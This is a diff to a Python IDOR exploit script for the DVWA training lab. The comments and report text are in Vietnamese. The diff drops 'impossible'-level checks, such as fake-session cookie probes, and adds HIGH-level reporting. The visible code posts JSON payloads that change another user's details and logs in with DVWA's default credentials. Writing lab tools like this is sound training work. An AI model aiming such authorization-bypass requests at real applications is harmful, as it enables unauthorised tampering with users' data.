@@ -36,7 +36,7 @@ class DVVAAuthBypassExploiter:
         """Print banner"""
         print(f"{Fore.CYAN}{'='*80}")
         print(f"{Fore.YELLOW}DVWA AUTHORIZATION BYPASS IDOR EXPLOITER")
-        print(f"{Fore.CYAN}Cấp độ Low và Medium")
+        print(f"{Fore.CYAN}Cấp độ Low, Medium và High")
         print(f"{Fore.CYAN}{'='*80}")
     
     def login(self, username, password):
@@ -632,122 +632,6 @@ class DVVAAuthBypassExploiter:
             except Exception as e:
                 print(f"{Fore.YELLOW}[!] {method} {endpoint}: Error - {e}")
 
-    def test_impossible_security(self):
-        """Test cấp độ IMPOSSIBLE"""
-        print(f"\n{Fore.CYAN}{'='*80}")
-        print(f"{Fore.YELLOW}KIỂM TRA CẤP ĐỘ IMPOSSIBLE")
-        print(f"{Fore.CYAN}{'='*80}")
-        
-        print(f"\n{Fore.WHITE}[Bước 1] Đặt security level")
-        self.set_security_level("impossible")
-        
-        print(f"\n{Fore.WHITE}[Bước 2] Kiểm tra toàn diện")
-        
-        endpoints_to_test = [
-            ("GET", "/vulnerabilities/authbypass/", "HTML Page"),
-            ("GET", "/vulnerabilities/authbypass/get_user_data.php", "API Get Data"),
-            ("POST", "/vulnerabilities/authbypass/change_user_details.php", "API Update Data"),
-            ("GET", "/vulnerabilities/authbypass/update_user.php", "Update Page"),
-            ("POST", "/vulnerabilities/authbypass/save_user.php", "Save API")
-        ]
-        
-        vulnerabilities_found = []
-        
-        for method, endpoint, description in endpoints_to_test:
-            url = f"{self.base_url}{endpoint}"
-            
-            try:
-                if method == 'GET':
-                    response = self.session.get(url, timeout=5)
-                elif method == 'POST':
-                    # Tạo payload mẫu
-                    payload = {'user_id': 2, 'first_name': 'test', 'surname': 'test'}
-                    headers = {'Content-Type': 'application/json'}
-                    response = self.session.post(url, json=payload, headers=headers, timeout=5)
-                
-                print(f"\n{Fore.CYAN}{description}: {endpoint}")
-                print(f"Method: {method}")
-                print(f"Status: HTTP {response.status_code}")
-                
-                if response.status_code == 200:
-                    # Kiểm tra nội dung phản hồi
-                    if 'admin' in response.text.lower() and 'gordonb' in self.session.cookies.get('PHPSESSID', ''):
-                        print(f"{Fore.RED}[!] CÓ THỂ CÓ LỖ HỔNG!")
-                        vulnerabilities_found.append(f"{description} - HTTP 200 với non-admin user")
-                    elif response.status_code == 200 and len(response.text) < 100:
-                        print(f"{Fore.YELLOW}[?] Response ngắn, cần kiểm tra thêm")
-                    else:
-                        print(f"{Fore.GREEN}[+] Có vẻ an toàn")
-                elif response.status_code == 403:
-                    print(f"{Fore.GREEN}[+] Forbidden - Kiểm tra ủy quyền hoạt động")
-                elif response.status_code == 404:
-                    print(f"{Fore.YELLOW}[-] Not Found")
-                else:
-                    print(f"{Fore.YELLOW}[?] Status code không xác định: {response.status_code}")
-                    
-            except Exception as e:
-                print(f"{Fore.RED}[!] Error: {e}")
-        
-        # Kiểm tra session validation
-        print(f"\n{Fore.WHITE}[Bước 3] Kiểm tra session validation...")
-        
-        # Thử sử dụng session token giả mạo
-        fake_session = requests.Session()
-        fake_session.verify = False
-        fake_session.headers.update(self.session.headers)
-        fake_session.cookies.set('PHPSESSID', 'fake_session_123456', domain='localhost')
-        fake_session.cookies.set('security', 'impossible', domain='localhost')
-        
-        test_url = f"{self.base_url}/vulnerabilities/authbypass/get_user_data.php"
-        response = fake_session.get(test_url, timeout=5)
-        
-        print(f"\nFake Session Test:")
-        print(f"URL: {test_url}")
-        print(f"Status: HTTP {response.status_code}")
-        
-        if response.status_code == 200:
-            print(f"{Fore.RED}[!] Session validation có vấn đề!")
-            vulnerabilities_found.append("Session validation không hoạt động")
-        else:
-            print(f"{Fore.GREEN}[+] Session validation hoạt động")
-        
-        return vulnerabilities_found
-
-    def exploit_impossible_level(self):
-        """Kiểm tra cấp độ IMPOSSIBLE"""
-        print(f"\n{Fore.CYAN}{'='*80}")
-        print(f"{Fore.YELLOW}KIỂM TRA CẤP ĐỘ IMPOSSIBLE")
-        print(f"{Fore.CYAN}{'='*80}")
-        
-        # Bước 1: Login với gordonb
-        print(f"\n{Fore.WHITE}[Bước 1] Login gordonb")
-        
-        if self.login('gordonb', 'abc123'):
-            # Bước 2: Set security impossible
-            print(f"\n{Fore.WHITE}[Bước 2] Set security")
-            self.set_security_level("impossible")
-            
-            # Bước 3: Test toàn diện
-            print(f"\n{Fore.WHITE}[Bước 3] Kiểm tra toàn diện")
-            
-            vulnerabilities = self.test_impossible_security()
-            
-            if vulnerabilities:
-                print(f"\n{Fore.RED}{'='*80}")
-                print(f"{Fore.YELLOW}PHÁT HIỆN LỖ HỔNG Ở CẤP ĐỘ IMPOSSIBLE!")
-                print(f"{Fore.RED}{'='*80}")
-                
-                for i, vuln in enumerate(vulnerabilities, 1):
-                    print(f"{i}. {vuln}")
-                
-                print(f"\n{Fore.YELLOW}[!] LƯU Ý: Cấp độ Impossible được thiết kế để an toàn.")
-                print(f"    Nếu phát hiện lỗ hổng, có thể có vấn đề với implementation.")
-            else:
-                print(f"\n{Fore.GREEN}{'='*80}")
-                print(f"{Fore.YELLOW}CẤP ĐỘ IMPOSSIBLE AN TOÀN")
-                print(f"{Fore.GREEN}Không tìm thấy lỗ hổng IDOR ở cấp độ Impossible")
-                print(f"{Fore.GREEN}{'='*80}")
-
     def test_additional_payloads(self):
         """Test thêm các payload IDOR khác"""
         print(f"\n{Fore.WHITE}[*] Testing additional IDOR payloads...")
@@ -888,14 +772,6 @@ class DVVAAuthBypassExploiter:
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
             })
 
-            # Test IMPOSSIBLE level
-            print(f"\n{Fore.CYAN}{'='*80}")
-            print(f"{Fore.YELLOW}PHASE 4: TESTING IMPOSSIBLE SECURITY LEVEL")
-            print(f"{Fore.CYAN}{'='*80}")
-            
-            self.exploit_impossible_level()
-            results['impossible_level'] = True
-
         except KeyboardInterrupt:
             print(f"\n{Fore.RED}[!] Test bị gián đoạn")
         except Exception as e:
@@ -918,7 +794,6 @@ class DVVAAuthBypassExploiter:
         print(f"  LOW Level IDOR: {'VULNERABLE' if results.get('low_level') else 'SECURE'}")
         print(f"  MEDIUM Level IDOR: {'VULNERABLE' if results.get('medium_level') else 'SECURE'}")
         print(f"  HIGH Level IDOR: {'VULNERABLE' if results.get('high_level') else 'SECURE'}")
-        print(f"  IMPOSSIBLE Level IDOR: {'VULNERABLE' if results.get('impossible_level') else 'SECURE'}")
         
         print(f"\n{Fore.CYAN}{'='*80}")
         print(f"{Fore.YELLOW}RECOMMENDATIONS")
@@ -938,14 +813,6 @@ class DVVAAuthBypassExploiter:
         print(f"   - Validate session tokens cho tất cả API calls")
         print(f"   - Kiểm tra user permissions trước khi thực hiện thay đổi dữ liệu")
         print(f"   - Implement CSRF tokens cho các thao tác thay đổi dữ liệu")
-        
-        print(f"\n{Fore.WHITE}4. Best practices cho cấp độ IMPOSSIBLE:")
-        print(f"   - Sử dụng UUID thay vì sequential IDs")
-        print(f"   - Implement proper session management với expiration")
-        print(f"   - Sử dụng JWT tokens với proper signatures")
-        print(f"   - Log tất cả các truy cập vào sensitive endpoints")
-        print(f"   - Implement rate limiting cho API calls")
-        print(f"   - Sử dụng database-level permissions")
         
         print(f"\n{Fore.WHITE}3. Phòng ngừa IDOR nói chung:")
         print(f"   - Sử dụng tham chiếu đối tượng gián tiếp (UUID thay vì ID tuần tự)")
@@ -971,6 +838,7 @@ class DVVAAuthBypassExploiter:
             f.write("-"*40 + "\n")
             f.write(f"LOW Level: {'VULNERABLE' if results.get('low_level') else 'SECURE'}\n")
             f.write(f"MEDIUM Level: {'VULNERABLE' if results.get('medium_level') else 'SECURE'}\n\n")
+            f.write(f"HIGH Level: {'VULNERABLE' if results.get('high_level') else 'SECURE'}\n")
             
             f.write("ĐÃ TÌM THẤY LỖ HỔNG:\n")
             f.write("-"*40 + "\n")
@@ -994,6 +862,17 @@ class DVVAAuthBypassExploiter:
                 f.write("   - Bảo mật tất cả API endpoints với proper authentication\n")
                 f.write("   - Implement access control cho từng API call\n")
                 f.write("   - Sử dụng JWT tokens hoặc session validation cho API requests\n\n")
+
+            if results.get('high_level'):
+                f.write("3. CẤP ĐỘ HIGH: Truy cập API change_user_details.php\n")
+                f.write("   Mức độ ảnh hưởng: Người dùng không phải admin có thể THAY ĐỔI dữ liệu người dùng\n")
+                f.write("   Tác động: Sửa đổi trái phép dữ liệu, phá vỡ tính toàn vẹn dữ liệu, tấn công integrity\n")
+                f.write("   Nguyên nhân: Thiếu kiểm tra session và permission cho API update operations\n")
+                f.write("   Cách khắc phục:\n")
+                f.write("   - Implement server-side session validation cho tất cả write operations\n")
+                f.write("   - Sử dụng CSRF tokens cho các thao tác thay đổi dữ liệu\n")
+                f.write("   - Log tất cả các attempts truy cập vào update endpoints\n")
+                f.write("   - Implement database transaction logging\n\n")
             
             f.write("PHƯƠNG PHÁP KIỂM THỬ:\n")
             f.write("-"*50 + "\n")
@@ -1040,19 +919,6 @@ class DVVAAuthBypassExploiter:
                 f.write("- Nguy cơ financial fraud và data manipulation\n")
                 f.write("- Compliance violations nghiêm trọng\n")
                 f.write("- Cần khắc phục NGAY LẬP TỨC (immediate remediation)\n\n")
-            
-            # IMPOSSIBLE Level
-            if results.get('impossible_level'):
-                f.write("CẤP ĐỘ IMPOSSIBLE: THẢM HỌA BẢO MẬT (CATASTROPHIC SEVERITY)\n")
-                f.write("- CVSS Score: 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)\n")
-                f.write("- HỆ THỐNG HOÀN TOÀN KHÔNG AN TOÀN (complete security failure)\n")
-                f.write("- Phá vỡ tất cả các lớp bảo vệ bảo mật\n")
-                f.write("- Toàn bộ dữ liệu và chức năng có thể bị xâm phạm\n")
-                f.write("- Nguy cơ mất dữ liệu vĩnh viễn (permanent data loss)\n")
-                f.write("- Business continuity bị đe dọa nghiêm trọng\n")
-                f.write("- Có thể dẫn đến legal action và regulatory fines\n")
-                f.write("- YÊU CẦU KHẮC PHỤC KHẨN CẤP VÀ TOÀN DIỆN\n")
-                f.write("- Cần shutdown hệ thống nếu không thể fix ngay\n\n")
 
             f.write("PHÂN TÍCH RỦI RO:\n")
             f.write("-"*50 + "\n")
@@ -1070,10 +936,7 @@ class DVVAAuthBypassExploiter:
                 f.write("   - Trung bình: Chủ yếu là chi phí khắc phục\n")
             
             f.write("\n2. RỦI RO DANH TIẾNG:\n")
-            if results.get('impossible_level'):
-                f.write("   - Thảm họa: Mất lòng tin hoàn toàn của khách hàng\n")
-                f.write("   - Media exposure: High risk of public disclosure\n")
-            elif results.get('high_level'):
+            if results.get('high_level'):
                 f.write("   - Rất cao: Thiệt hại nghiêm trọng đến brand reputation\n")
                 f.write("   - Customer trust: Bị phá vỡ nghiêm trọng\n")
             elif results.get('medium_level'):
@@ -1087,37 +950,29 @@ class DVVAAuthBypassExploiter:
             f.write("   - Data Protection Laws: Multiple jurisdictions affected\n")
             
             f.write("\n4. RỦI RO VẬN HÀNH:\n")
-            if results.get('high_level') or results.get('impossible_level'):
+            if results.get('high_level'):
                 f.write("   - Rất cao: Hệ thống có thể bị compromise hoàn toàn\n")
                 f.write("   - Business disruption: High probability\n")
                 f.write("   - Data corruption: Critical risk\n")
 
             f.write("KHUYẾN NGHỊ ƯU TIÊN:\n")
             f.write("-"*50 + "\n")
-
-            if results.get('impossible_level'):
-                f.write("1. ƯU TIÊN KHẨN CẤP TỐI ĐA (EMERGENCY - SEV-1):\n")
-                f.write("   - Ngay lập tức: Isolate hệ thống nếu có thể\n")
-                f.write("   - Trong 1 giờ: Assemble incident response team\n")
-                f.write("   - Trong 4 giờ: Root cause analysis và containment\n")
-                f.write("   - Trong 24 giờ: Implement temporary fixes\n")
-                f.write("   - Trong 72 giờ: Complete security review và permanent fixes\n\n")
             
             if results.get('high_level'):
-                f.write("2. ƯU TIÊN CAO (HIGH PRIORITY - SEV-2):\n")
+                f.write("1. ƯU TIÊN CAO (HIGH PRIORITY - SEV-2):\n")
                 f.write("   - Ngay lập tức: Implement additional monitoring\n")
                 f.write("   - Trong 4 giờ: Review và fix update APIs\n")
                 f.write("   - Trong 24 giờ: Implement CSRF protection\n")
                 f.write("   - Trong 48 giờ: Security testing và validation\n\n")
             
             if results.get('medium_level'):
-                f.write("3. ƯU TIÊN TRUNG BÌNH-CAO (MEDIUM-HIGH PRIORITY - SEV-3):\n")
+                f.write("2. ƯU TIÊN TRUNG BÌNH-CAO (MEDIUM-HIGH PRIORITY - SEV-3):\n")
                 f.write("   - Trong 24 giờ: Secure all API endpoints\n")
                 f.write("   - Trong 48 giờ: Implement proper access control\n")
                 f.write("   - Trong 1 tuần: Data access audit và logging\n\n")
             
             if results.get('low_level'):
-                f.write("4. ƯU TIÊN TRUNG BÌNH (MEDIUM PRIORITY - SEV-4):\n")
+                f.write("3. ƯU TIÊN TRUNG BÌNH (MEDIUM PRIORITY - SEV-4):\n")
                 f.write("   - Trong 48 giờ: Implement server-side authorization\n")
                 f.write("   - Trong 1 tuần: Code review cho client-side checks\n")
                 f.write("   - Trong 2 tuần: Security training for developers\n\n")
@@ -1125,7 +980,7 @@ class DVVAAuthBypassExploiter:
             f.write("TIMELINE KHẮC PHỤC ĐỀ XUẤT:\n")
             f.write("-"*50 + "\n")
             
-            has_critical = results.get('impossible_level') or results.get('high_level')
+            has_critical = results.get('high_level')
             
             if has_critical:
                 f.write("KHẨN CẤP (0-24 giờ):\n")
@@ -1174,8 +1029,8 @@ def main():
     """Main function"""
     parser = argparse.ArgumentParser(description='DVWA Authorization Bypass IDOR Exploiter')
     parser.add_argument('-u', '--url', required=True, help='DVWA base URL (e.g., http://localhost:42001)')
-    parser.add_argument('-l', '--level', choices=['low', 'medium', 'high', 'impossible', 'all'], default='all', 
-                       help='Security level to test (low, medium, high, impossible, all)')
+    parser.add_argument('-l', '--level', choices=['low', 'medium', 'high', 'all'], default='all', 
+                       help='Security level to test (low, medium, high, all)')
     
     args = parser.parse_args()
     
@@ -1197,10 +1052,6 @@ def main():
         exploiter.print_banner()
         if exploiter.login('gordonb', 'abc123'):
             exploiter.exploit_high_level()
-    elif args.level == 'impossible':
-        exploiter.print_banner()
-        if exploiter.login('gordonb', 'abc123'):
-            exploiter.exploit_impossible_level
 
 if __name__ == "__main__":
     main()
